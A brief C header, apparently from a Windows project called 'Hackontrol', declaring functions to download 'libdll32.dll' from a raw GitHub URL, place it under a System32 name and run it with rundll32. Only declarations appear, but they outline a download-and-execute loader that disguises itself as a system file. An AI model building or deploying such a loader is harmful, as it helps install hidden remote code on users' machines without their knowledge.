#pragma once

#include <khopanwin32.h>

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FILE_LIBDLL32     L"libdll32.dll"
#define FILE_RUNDLL32     L"rundll32.exe"
#define FOLDER_SYSTEM32   L"System32"
#define URL_LIBDLL32_FILE "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libdll32.dll"

void WaitForLibdll32ToExit(DWORD processIdentifier);
void DownloadLatestLibdll32();
void ExecuteLibdll32();
